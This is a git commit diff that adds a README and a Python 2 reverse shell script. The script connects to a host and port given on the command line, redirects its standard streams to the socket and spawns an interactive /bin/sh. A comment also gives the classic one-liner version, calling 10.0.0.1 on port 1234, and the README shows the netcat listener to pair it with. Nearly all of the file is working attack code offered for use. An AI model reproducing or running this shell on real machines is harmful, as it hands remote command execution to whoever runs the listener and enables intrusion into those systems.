73c05962c38e7772fad024bc2227bcdacddf754e
Pawel Cygal <pcygal@akamai.com>
2018-11-23 14:36:18 +0100

    added Readme file and usage function

--- README.md
+++ README.md
@@ -1,1 +1,22 @@
-# python_rev_shell
+# bash_rev_shell
+Simple reverse shell in python
+
+# Usage
+
+First run listener on machine where you want to access revers shell.
+for example:
+```
+nc -l -p 8080 -vvv -k
+```
+
+```
+./rev_shell.py
+
+Err: Something went wrong. Did you check usage ?
+USAGE: ./rev_shell.py <ip_or_fqdn> <port_number>
+ ```
+ 
+ # Example:
+ ```
+ ./rev_shell.py example.com 8080
+```
---
+++ rev_shell.py
@@ -0,0 +1,37 @@
+#!/usr/local/bin/python
+# one liner example:
+# import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
+#           s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \
+#           os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+import socket
+import subprocess
+import os
+import sys
+
+
+def usage():
+    print 'USAGE: %s <ip_or_fqdn> <port_number>' % sys.argv[0]
+
+
+def start_rev_shell(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    p = subprocess.call(["/bin/sh", "-i"])
+    return p
+
+
+def main():
+    if len(sys.argv) < 2:
+        print 'Err: Something went wrong. Did you check usage ?'
+        usage()
+        sys.exit(1)
+    else:
+        ip = sys.argv[1]
+        port = int(sys.argv[2])
+        start_rev_shell(ip, port)
+
+main()
